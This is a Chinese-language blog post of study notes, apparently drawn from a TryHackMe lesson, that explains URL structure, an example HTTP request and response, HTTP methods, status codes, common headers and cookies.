<h5 id="请求和响应"><a href="#请求和响应" class="headerlink" title="请求和响应"></a>请求和响应</h5><p>什么是 URL？（统一资源定位器）<br>方案：这指示使用什么协议来访问资源，例如HTTP、HTTPS、FTP（文件传输协议）。<br>用户：有些服务需要认证才能登录，您可以将用户名和密码放入URL中登录。<br>主机：您想要访问的服务器的域名或 IP 地址。<br>端口：您要连接的端口，通常HTTP为 80 ，HTTPS 为 443，但可以托管在 1 - 65535 之间的任何端口上。<br>路径：您尝试访问的资源的文件名或位置。<br>查询字符串：可以发送到请求路径的额外信息。例如，&#x2F;blog? id&#x3D;1会告诉博客路径您希望接收 id 为 1 的博客文章。<br>片段：这是对实际请求的页面上某个位置的引用。这通常用于内容较长的页面，并且可以将页面的某个部分直接链接到它，这样用户一访问该页面就可以立即看到它。<br>提出请求    只需一行“ GET &#x2F; HTTP &#x2F;1.1 ”即可向 Web 服务器发出请求</p>
<p>示例请求</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>tryhackme.com</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 Firefox/87.0</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://tryhackme.com/</span><br></pre></td></tr></table></figure>
<p>第 1 行：此请求发送 GET 方法（有关更多信息，请参阅HTTP方法任务），使用 &#x2F; 请求主页，并告知 Web 服务器我们正在使用HTTP协议版本 1.1。<br>第 2 行：我们告诉 Web 服务器我们想要访问网站 tryhackme.com<br>第 3 行：我们告诉 Web 服务器我们正在使用 Firefox 87 版浏览器<br>第 4 行：我们告诉 Web 服务器，引导我们访问此网站的网页是<a target="_blank" rel="noopener" href="https://tryhackme.com/">https://tryhackme.com</a><br>第 5 行：HTTP请求总是以一个空白行结束，以通知 Web 服务器请求已完成。</p>
<p>响应示例</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.15.8</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri, 09 Apr 2021 13:34:03 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>98</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>TryHackMe<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    Welcome To TryHackMe.com</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>第 1 行：HTTP 1.1 是服务器正在使用的 HTTP 协议的版本，后面跟着 HTTP 状态代码（在本例中为“200 Ok”），这告诉我们请求已成功完成。<br>第 2 行：这告诉我们 Web 服务器软件和版本号。<br>第 3 行： Web 服务器的当前日期、时间和时区。<br>第 4 行： Content-Type 标头告诉客户端要发送什么类型的信息，例如 HTML、图像、视频、pdf、XML。<br>第 5 行： Content-Length 告诉客户端响应有多长，这样我们就可以确认没有丢失任何数据。<br>第 6 行：HTTP响应包含一个空白行，以确认HTTP响应的结束。<br>第 7-14 行：已请求的信息，在本例中为主页。</p>
<h5 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a>HTTP方法</h5><p>GET请求<br>这用于从网络服务器获取信息。<br>POST请求<br>这用于向 Web 服务器提交数据并可能创建新记录<br>PUT请求<br>这用于向网络服务器提交数据以更新信息<br>删除请求(DELETE Request)<br>这用于从网络服务器删除信息&#x2F;记录。</p>
<h5 id="HTTP状态代码"><a href="#HTTP状态代码" class="headerlink" title="HTTP状态代码"></a>HTTP状态代码</h5><table>
<thead>
<tr>
<th><strong>200——确定</strong></th>
<th>请求已成功完成。</th>
</tr>
</thead>
<tbody><tr>
<td><strong>201——已创建</strong></td>
<td>已创建资源（例如新用户或新博客文章）。</td>
</tr>
<tr>
<td><strong>301 - 永久移动</strong></td>
<td>这会将客户端的浏览器重定向到新的网页或告诉搜索引擎该页面已移动到其他地方并改为在那里查看。</td>
</tr>
<tr>
<td><strong>302 - 已找到</strong></td>
<td>与上面的永久重定向类似，但顾名思义，这只是暂时的改变，在不久的将来可能会再次改变。</td>
</tr>
<tr>
<td><strong>400 - 错误请求</strong></td>
<td>这告诉浏览器他们的请求中存在错误或缺失。如果正在请求的 Web 服务器资源需要客户端未发送的某个参数，则有时可以使用此功能。</td>
</tr>
<tr>
<td><strong>401-未授权</strong></td>
<td>目前，您不被允许查看此资源，除非您获得 Web 应用程序的授权（通常是用户名和密码）。</td>
</tr>
<tr>
<td><strong>403 - 禁止访问</strong></td>
<td>无论您是否登录，您都没有权限查看此资源。</td>
</tr>
<tr>
<td><strong>405 - 方法不允许</strong></td>
<td>资源不允许此方法请求，例如，您向资源 &#x2F;create-account 发送了 GET 请求，而它本来期望的是 POST 请求。</td>
</tr>
<tr>
<td><strong>404 - 页面未找到</strong></td>
<td>您请求的页面&#x2F;资源不存在。</td>
</tr>
<tr>
<td><strong>500 - 内部服务错误</strong></td>
<td>服务器在处理您的请求时遇到某种错误，并且不知道如何正确处理。</td>
</tr>
<tr>
<td><strong>503 - 服务不可用</strong></td>
<td>该服务器无法处理您的请求，因为它超载或正在维护。</td>
</tr>
</tbody></table>
<h5 id="标头"><a href="#标头" class="headerlink" title="标头"></a>标头</h5><p>在发出请求时可以发送到 Web 服务器的附加数据位。</p>
<table>
<thead>
<tr>
<th>通用请求标头</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>HOST</td>
<td>一些网络服务器托管多个网站，因此通过提供主机标头，您可以告诉它您需要哪一个网站，否则您只会收到服务器的默认网站。</td>
</tr>
<tr>
<td>User-Agent</td>
<td>这是您的浏览器软件和版本号，告诉网络服务器您的浏览器软件有助于它为您的浏览器正确格式化网站，并且 HTML、JavaScript 和 CSS 的某些元素仅在某些浏览器中可用。</td>
</tr>
<tr>
<td>Content-Agent</td>
<td>当以表单等形式向 Web 服务器发送数据时，内容长度会告知 Web 服务器在 Web 请求中需要多少数据。这样，服务器就可以确保不会丢失任何数据。</td>
</tr>
<tr>
<td>Accept-Encoding</td>
<td>告诉网络服务器浏览器支持哪些类型的压缩方法，以便数据可以变得更小，以便在互联网上传输。</td>
</tr>
<tr>
<td>Cookie</td>
<td>发送到服务器以帮助记住您的信息的数据</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>常见响应标头</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>Set-Cookie</td>
<td>存储每次请求时发送回 Web 服务器的信息</td>
</tr>
<tr>
<td>Cache-Control</td>
<td>在浏览器再次请求之前，将响应内容存储在浏览器缓存中多长时间。</td>
</tr>
<tr>
<td>Content-Type</td>
<td>客户端返回的数据类型，即 HTML、CSS、JavaScript、图像、PDF、视频等。使用 content-type 标头，浏览器就知道如何处理数据。</td>
</tr>
<tr>
<td>Content-Encoding</td>
<td>在互联网上发送数据时，使用了什么方法压缩数据以使其更小。</td>
</tr>
</tbody></table>
<h5 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h5><p>只是存储在您计算机上的一小段数据。当您从 Web 服务器收到“Set-Cookie”标头时，Cookie 就会保存。然后，您发出的每一个后续请求都会将 Cookie 数据发送回 Web 服务器。</p>

        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/2024/09/03/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/"
      title="渗透基础"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        渗透基础
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2024/09/02/Java/"
      title="Java"
     >

    <p class="title-text">
      
        Java
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>





    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2024 T1@n<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>
